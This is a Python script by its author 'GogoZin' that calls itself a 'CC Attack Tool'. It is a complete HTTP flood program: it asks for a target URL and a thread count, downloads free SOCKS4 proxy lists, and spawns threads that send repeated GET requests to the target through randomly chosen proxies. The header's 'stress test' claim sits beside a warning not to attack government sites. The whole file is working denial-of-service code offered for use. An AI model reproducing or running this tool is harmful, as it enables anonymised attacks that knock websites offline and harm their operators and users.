###########################################
#	This Script Is Code By GogoZin    #
#	Can Use In Stress Test            #
#	But Don't Attack Any Gov Site     #
#	If Want Me To Keep Update         #
###########################################

import requests
import random
import time
import threading
from colorama import Fore

print(Fore.GREEN + """    	     .,:ccllllc:,.              
          .lOXWMMMMMMMMMWXOo,           
        .lKWMMMMMMMMMMMMMMMMNk:.        
      .oKWMMMMMMMMMMMMMMMMMMMMNx'       
     .xWMMMMMMMMMMMMMMMMMMMMMMMWO'      
     ;KMMMMMMMMMMMMMMMMMMMMMMMMMWd.     
     :XNKXWMMMMMMMMMMMMMMMMMMNXXWk.     
     ;Kx..:d0NMMMMMMMMMMMMXkc,.;0d.     
     .OO'   .,oOXWMMMMNKkc'    c0:      
      :KOc,.....:xXNNKd,....';oKk.      
       cXMWXK000XOlccdKK00KXNWMNc       
      .dWMMWX0XMNdcocckMMWX00NMNl       
      .oXX0o..oWWNNWNXNMMK; .oKx'       
        ....  cNXNNXXXOKWx.  ..         
              ,KKKX000OKK;              
              '0KKX0KK0X0'              
              .OK0XKKK0XO.              
              .k00K0K00Xk.              
               ldxOxOkx0o               
               ..',,;,',.               
""")
print("  CC Attack Tool Using Requests Module")
print("      Code By GogoZin. -2019/8/2")
print("       Last Update In 2019/8/10")

#Code By GogoZin 

def opth(): 
	for i in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(i+1) + " Created")
	print("Wait A Few Seconds For Threads Ready To Attack ...")
	time.sleep(3)
	input("Press Enter To Launch Attack !")
	global on 
	on = True

on = False
def main():
	global pprr
	global list
	global proxy
	global url
	global pwr
	global thr
	global on
	url = str(input(Fore.BLUE + "Target : " + Fore.WHITE))
	thr = int(input(Fore.BLUE + "Threads : " + Fore.WHITE))
	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
	if cho =='y':
		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000&country=all') #Code By GogoZin
		with open('socks.txt','wb') as fp:
			fp.write(rsp.content)
			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
	else:
		pass
	list = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
	if list =="":
		list = 'socks.txt'
	else:
		list = str(list)
	pprr = open(list).readlines()
	print(Fore.BLUE + "Socks Count : " + Fore.WHITE + "%d " %len(pprr))
	pwr = int(input(Fore.BLUE + "CC.Power (1-100) : " + Fore.WHITE))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = requests.session()
	s.proxies = {}
	s.proxies['http'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
	s.proxies['https'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
	time.sleep(10)
	while True:
		while on:
			try:
				s.get(url)
				#Code By GogoZin
				try:
					for y in range(pwr):
						s.get(url)
						print(Fore.BLUE + "Socks CC Flood From ~[ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ] " + Fore.WHITE)
					s.close
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + "Can't Connet To This Socks . . . Skip ~>" + Fore.WHITE)


if __name__ == "__main__":
	main()
